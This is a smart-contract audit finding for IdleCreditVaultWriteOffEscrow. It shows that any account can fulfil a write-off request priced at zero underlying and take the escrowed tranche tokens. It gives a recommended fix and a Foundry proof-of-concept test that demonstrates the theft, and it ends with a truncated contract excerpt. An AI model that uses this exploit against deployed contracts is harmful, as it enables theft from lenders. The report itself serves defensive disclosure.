### Title
Any EOA can seize collateral from zero-priced write-off requests - (`contracts/IdleCreditVaultWriteOffEscrow.sol`)

### Summary
`IdleCreditVaultWriteOffEscrow` permits a lender to escrow tranche tokens while requesting zero underlying tokens, and any unprivileged account can immediately fulfill that request and receive the entire escrowed tranche balance without paying anything.

### Finding Description
`createWriteOffRequest` validates only that `amount` is nonzero; it does not require `underlyingsRequested` to be nonzero. [1](#0-0) 

`fullfillWriteOffRequest` is intentionally callable by any wallet and only requires the supplied tranche amount to equal the request and the supplied underlying amount to be at least the requested amount. [2](#0-1) 

When the lender’s request has `underlyings == 0`, an attacker can call `fullfillWriteOffRequest(lender, tranches, 0)`. The request is deleted, no underlying is paid to the lender, and the full tranche collateral is transferred to the attacker. [3](#0-2) 

### Impact Explanation
The attacker steals the full tranche amount escrowed in the zero-priced request. In the PoC below, the lender loses `10,000e18` tranche tokens and receives zero underlying, while the attacker receives all `10,000e18` tranche tokens. [4](#0-3) 

### Likelihood Explanation
Exploitation requires a lender to create a request with `underlyingsRequested == 0`, but the transaction is publicly visible and fulfillment is permissionless. No privileged role, timing manipulation, oracle, or protocol insolvency is required. [2](#0-1) 

### Recommendation
Reject write-off requests with zero underlying consideration in `createWriteOffRequest`, preferably using a configurable minimum underlying amount rather than merely `underlyingsRequested > 0`, because a one-wei request would remain economically equivalent to a free transfer. If zero-consideration write-offs are intentionally supported, fulfillment should be restricted or require an explicit separate confirmation rather than exposing the escrowed collateral to any first caller. [5](#0-4) 

### Proof of Concept
Add this test to `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol`, whose fixture already gives `LP` a tranche balance and approval during an active epoch:

```solidity
function testZeroUnderlyingRequestCanBeFulfilledForFree() external {
    uint256 requestedTranches = 10_000e18;
    address attacker = makeAddr("attacker");

    uint256 lpTranchePre = tranche.balanceOf(LP);
    uint256 lpUnderlyingPre = underlying.balanceOf(LP);
    uint256 attackerTranchePre = tranche.balanceOf(attacker);

    // LP escrows tranche collateral but accidentally requests zero underlying.
    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, 0);

    assertEq(
        lpTranchePre - tranche.balanceOf(LP),
        requestedTranches,
        "collateral was not escrowed"
    );

    // Any unprivileged account can satisfy the zero-underlying ask for free.
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);

    (uint256 tranches, uint256 underlyings) = escrow.userRequests(LP);

    assertEq(tranches, 0, "request was not consumed");
    assertEq(underlyings, 0, "request underlying amount was not consumed");
    assertEq(
        tranche.balanceOf(attacker) - attackerTranchePre,
        requestedTranches,
        "attacker did not receive collateral"
    );
    assertEq(
        underlying.balanceOf(LP),
        lpUnderlyingPre,
        "lender unexpectedly received underlying"
    );

    // The stolen collateral cannot be claimed a second time.
    vm.expectRevert(Is0.selector);
    vm.prank(attacker);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, 0);
}
```

  /// @notice create a write-off request by depositing tranche tokens and setting the amount of underlyings requested
  /// @param amount of tranche tokens to deposit
  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);

    // update user requests

      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
